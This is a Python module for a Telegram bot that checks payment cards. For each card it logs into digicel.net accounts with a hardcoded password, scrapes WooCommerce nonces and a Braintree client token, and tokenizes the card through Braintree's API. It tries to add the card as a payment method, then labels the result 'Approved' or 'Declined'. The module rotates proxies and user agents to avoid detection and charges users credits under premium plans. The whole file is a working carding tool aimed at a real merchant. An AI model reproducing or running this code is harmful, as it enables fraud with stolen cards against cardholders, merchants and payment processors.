
import re
import time
import base64
import random
import traceback
import aiohttp
from pyrogram import filters
from pyrogram.enums import ParseMode
from fake_useragent import UserAgent
from CARD3D import app
from config import OWNER_ID
from CARD3D.core.mongo import has_premium_access, get_user, update_user, LEVELS
from CARD3D.modules.proxies import proxies
from CARD3D.modules import sk_set

async def get_bin_info(bin_number):
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url, ssl=False) as response:
                if response.status == 200:
                    bin_info = await response.json()
                    return (
                        bin_info.get("brand", "N/A"),
                        bin_info.get("type", "N/A"),
                        bin_info.get("level", "N/A"),
                        bin_info.get("bank", "N/A"),
                        bin_info.get("country_name", "N/A"),
                        bin_info.get("country_flag", ""),
                    )
                else:
                    return "Error fetching BIN info", "N/A", "N/A", "N/A", "N/A", "N/A"
        except aiohttp.ClientError as e:
            return f"Error parsing BIN info: {e}", "N/A", "N/A", "N/A", "N/A", "N/A"

def extract_substring(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None
    
async def check_card(session, card_info, message, user_plan, user_plan_symbol, emails):
    card = card_info.strip().split("|")
    if len(card) != 4 or not all(card):
        return "Invalid card details. Please use the format: card_number|mm|yy|cvv"

    cc, mm, yy, cvv = card
    start_time = time.time()
    user = UserAgent().random

    headers_login_nonce = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }
    try:
        async with session.get('https://digicel.net/my-account/', headers=headers_login_nonce) as response:
            login_nonce = extract_substring(await response.text(), 'woocommerce-login-nonce" value="', '"')

        if not login_nonce:
            return "Failed to retrieve login nonce."
        print("login-nonce✅", login_nonce)

        headers_login_response = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://digicel.net',
            'priority': 'u=0, i',
            'referer': 'https://digicel.net/my-account/',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }
        

        mail = random.choice(emails)

        data = {
            'username': mail,
            'password': 'RAJNISHAYUSHI*1+0',
            'woocommerce-login-nonce': login_nonce,
            '_wp_http_referer': '/my-account/',
            'login': 'Log in'
        }

        async with session.post('https://digicel.net/my-account/', headers=headers_login_response, data=data) as login_response:
            if login_response.status != 200:
                print(f"Login failed for {mail} with status code {login_response.status}")
                return "Login failed."
            else:
                print(f"Login successful for {mail}")

        headers_initial = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'priority': 'u=0, i',
            'referer': 'https://digicel.net/my-account/payment-methods/',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }
        async with session.get('https://digicel.net/my-account/add-payment-method/', headers=headers_initial) as response:
            response_text = await response.text()
            client_token_nonce = extract_substring(response_text, '"client_token_nonce":"','"' )
            payment_nonce = extract_substring(response_text, '<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="','" />' )
            print("add_payment_method_nonce", payment_nonce)

        headers_token_request = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://digicel.net',
            'priority': 'u=1, i',
            'referer': 'https://digicel.net/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }

        data_token_request = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': client_token_nonce,
        }

        async with session.post('https://digicel.net/wp-admin/admin-ajax.php', headers=headers_token_request, data=data_token_request) as response:
            response_json = await response.json()
            client_token = response_json['data']
            decoded_token = base64.b64decode(client_token).decode('utf-8')
            authorization = extract_substring(decoded_token, '"authorizationFingerprint":"', '"')
            print("authorization", authorization)

        headers_payment = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {authorization}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://digicel.net',
            'priority': 'u=1, i',
            'referer': 'https://digicel.net/',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': user,
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': '06dcde69-e90a-43f9-82ec-12eaf13f09b2',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvv,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        async with session.post('https://payments.braintree-api.com/graphql', headers=headers_payment, json=json_data) as response:
            response_json = await response.json()
            token = response_json['data']['tokenizeCreditCard']['token']
            print("token✅", token)


        headers_final = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://digicel.net',
            'priority': 'u=0, i',
            'referer': 'https://digicel.net/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }
        data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'visa',
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
            'wc_braintree_credit_card_payment_nonce': token,
            'wc_braintree_device_data': '{"correlation_id":"ba0a0b209c4c796a105076f720610b56"}',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': payment_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        async with session.post('https://digicel.net/my-account/add-payment-method/', headers=headers_final, data=data) as response:
            text = await response.text()

        r1 = extract_substring(text, '<div class="wc-block-components-notice-banner__content">', '</div>')

        def clean_response(response_text):
            if response_text:
                response_text = response_text.replace("Status code", "").strip()
                response_text = ' '.join(response_text.split())
            return response_text or ""

        final_response = clean_response(r1).lower()

        if not final_response:
            print("No response found or response could not be parsed.")
            final_response = "Secret Key Revoked inform the Owner"

        approval_keywords = ['payment method added', 'you cannot add a new payment method so soon after the previous one. please wait for 20 seconds.', 'duplicate', 'Invalid postal code or street address.']

        if any(keyword in final_response for keyword in approval_keywords):
            status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱✅"
            final_response = "1000: Approved"

        elif 'risk_threshold' in final_response:
            status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
            final_response = "RISK: Retry this BIN later."

        else:
            status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"

        brand, card_type, level, bank, country, flag = await get_bin_info(cc[:6])

        execution_time = time.time() - start_time
        final_response = (
            f"{status}\n\n"
            f"𝗖𝗮𝗿𝗱 ⇾ `{cc}|{mm}|{yy}|{cvv}`\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth\n"
            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_response}\n\n"
            f"𝗜𝗻𝗳𝗼 ⇾ {brand} - {card_type} - {level}\n"
            f"𝗜𝘀𝘀𝘂𝗲𝗿 ⇾ {bank} 🏛\n"
            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⇾ {country} {flag}\n\n"
            f"𝗧𝗶𝗺𝗲 ⇾ {execution_time:.2f} **Seconds**\n"
            f"𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ⇾ [{message.from_user.first_name}](tg://user?id={message.from_user.id}) ⤿ {user_plan} {user_plan_symbol} ⤾"
        )
        return final_response

    except Exception as e:
        traceback.print_exc()
        return f"An error occurred: {e}"

card_pattern = re.compile(r"(\d{15,16})[|/:](\d{2})[|/:](\d{2,4})[|/:](\d{3,4})")

@app.on_message(filters.command("ba", prefixes=[".", "/", "!"]))
async def handle_check_card(client, message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    has_access, access_msg, user_plan = await has_premium_access(user_id, chat_id)
    if not has_access:
        await message.reply_text(access_msg, parse_mode=ParseMode.MARKDOWN)
        return

    user = await get_user(user_id)
    if not user:
        await message.reply_text("❌ You are not registered. Please use /register first.")
        return

    user_plan = user.get("plan", "Free")
    user_credits = user.get("credits", 0)
    user_plan_symbol = LEVELS.get(user_plan, {}).get("symbol", "")

    if user_id == OWNER_ID:
        user_plan = "STRIPEHIT"
        user_plan_symbol = LEVELS["STRIPEHIT"]["symbol"]
        user_credits = -1


    if not sk_set.email_list:
        await message.reply("Secret keys are not set, Report to owner")
        return
    
    emails = sk_set.email_list

    card_info = None
    if message.reply_to_message:
        match = re.search(card_pattern, message.reply_to_message.text)
        card_info = match.group() if match else None
    else:
        try:
            card_info = message.text.split(maxsplit=1)[1].strip()
        except IndexError:
            pass

    if not card_info or not card_pattern.match(card_info):
        await message.reply("Please provide valid card details in the format: `card_number|mm|yy|cvv`")
        return

    proxy = await proxies()

    async with aiohttp.ClientSession(proxy=proxy) as session:
        processing_msg = await message.reply("Processing your request...")
        try:
            response = await check_card(session, card_info, message, user_plan, user_plan_symbol, emails)
            await processing_msg.edit_text(response)
        except Exception as e:
            traceback.print_exc()
            await processing_msg.edit_text(f"An error occurred: {e}")

    if user_id != OWNER_ID:
            new_credits = user_credits - 10
            await update_user(user_id, {"credits": new_credits})
